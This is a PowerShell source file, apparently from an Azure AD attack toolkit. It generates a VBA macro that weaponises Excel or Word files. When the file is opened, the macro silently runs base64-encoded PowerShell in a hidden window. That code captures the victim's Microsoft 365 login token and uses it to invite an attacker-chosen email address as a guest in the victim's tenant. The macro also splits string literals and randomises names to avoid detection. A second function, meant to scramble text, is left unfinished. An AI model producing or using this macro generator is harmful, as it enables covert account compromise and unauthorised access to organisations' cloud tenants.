# This script contains functions for weaponising Office files

# Aug 6th 2020
function Generate-InvitationVBA
{
<#
    .SYNOPSIS
    Creates a VBA script block to weaponise Excel files to invite the given guest user to their tenant.

    .DESCRIPTION
    Creates a VBA script block to weaponise Excel files to invite the given guest user to their tenant.

    The script starts when the Excel workbook is opened:
    * Opens an Office 365 login window to get an access token
    * Using the access token, sends an invitation for the given email address

    Copy the generated script to clipboard and paste to Excel

    .Example
    New-AADIntInvitationVBA -Email someone@gmail.com | Set-ClipBoard

#>
[cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$Email,
        [Validateset("Workbook","Document")]
        [String]$Type="Workbook"
    )
    Process
    {
        #
        # Generate the PowerShell code block
        #

        # First some needed assemblies are imported.
        # Second, a Windows form object is created with a web browser control. The Outlook app id is used.
        # Third, the login window is shown and access token is fetched
        # Finally, the invitation for the given user is sent

        $e="`$e=""$Email"";"
        $code=@'
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Web;

$r="https://graph.microsoft.com";
$i="d3590ed6-52b3-4102-aeff-aad2292ab01c";
$u="urn:ietf:wg:oauth:2.0:oob";
$l="https://login.microsoftonline.com/common/oauth2/authorize?resource=$r&client_id=$i&response_type=code&haschrome=1&redirect_uri=$u&client-request-id=$((New-Guid).ToString())&prompt=login&scope=openid profile";

$f=[Windows.Forms.Form]::new();
$f.Width=560;
$f.Height=680;
$f.FormBorderStyle=3;
$f.TopMost=$true;
$w=[Windows.Forms.WebBrowser]::new();
$w.Size=$f.ClientSize;
$w.Anchor="Left,Top,Right,Bottom";
$f.Controls.Add($w);
$w.add_Navigated({if($_.Url.ToString().StartsWith($u)){$f.DialogResult="OK";$f.Close();};});
$w.Navigate($l);
if($f.ShowDialog()-ne"OK"){$f.Controls[0].Dispose();return};

$a=[Web.HttpUtility]::ParseQueryString($f.Controls[0].Url.Query);
$b=@{client_id=$i;grant_type="authorization_code";code=$a["code"];redirect_uri=$u};
$f.Controls[0].Dispose();

$c="application/x-www-form-urlencoded";
$o=irm -Uri "https://login.microsoftonline.com/common/oauth2/token" -ContentType $c -Method POST -Body $b;
$b="{""invitedUserEmailAddress"":""$e"",""sendInvitationMessage"":true,""inviteRedirectUrl"":""https://myapps.microsoft.com""}";
$o=irm -Uri "https://graph.microsoft.com/beta/invitations" -Method Post -Body $b -Headers @{"Authorization"="Bearer $($o.access_token)"};
'@
        # Convert the code block to Unicode and decode it with Base64
        $unicode=[text.encoding]::Unicode.getBytes("$e$code")
        $code=[convert]::ToBase64String($unicode)
        
        #
        # Create the VBA Code
        #

        # Generate a random function name
        $funcName = -join ((97..122) | Get-Random -Count 32 | % {[char]$_})
        $VBA = @"
Private Sub $($Type)_Open()
    $funcName
End Sub

Sub $funcName()`n
"@

        $p = 1

        # Split the Base64 encoded code to shorter chunks
        While(($p*500) -lt $code.Length)
        {
            $codeStr =   $($code.Substring(($p-1)*500,500))
            #$codeStrArr= $codeStr.ToCharArray()
            #[array]::Reverse($codeStrArr)
            #$codeStr = -join($codeStrArr)

            $VBA += "    i$p = ""$codeStr""`n"
            $p++
        }
        $VBA += "    i$p = ""$($code.Substring(($p-1)*500,$code.Length-($p-1)*500))""`n"
        $VBA += "    c1 = Chr(34) & ""pow"" & ""ershel"" & ""l.exe"" & Chr(34)`n"
        $VBA += "    c2 = ""-EncodedCommand """

        for($i=1;$i -lt $p+1 ; $i++)
        {
            $VBA += " & i$i"
        }
        $VBA += "`n"

        # Set PowerShell to start as hidden
        $VBA += "    c3 = "" -WindowStyle Hidden""`n"

        # Create Wscript.shell object
        $VBA += "    Set s2 = CreateObject(""Ws"" & ""cript"" & "".s"" & ""hell"")`n"

        # Invoke the PowerShell minimized
        $VBA += "    s2.Run c1 & c2 & c3, 2`n"
        $VBA += "End Sub`n"
        
        # Return
        $VBA
    }
}

function Scramble-Text
{

[cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]$Text,
        [Parameter(Mandatory=$True)]
        [String]$Secret
    )
    Process
    {
        $secretArray=$Secret.ToCharArray()
        $num=0
        foreach($char in $secretArray)
        {
            $num+=$char
        }
        $num = $num % 256

        $textArray = $Text.ToCharArray()

    }
}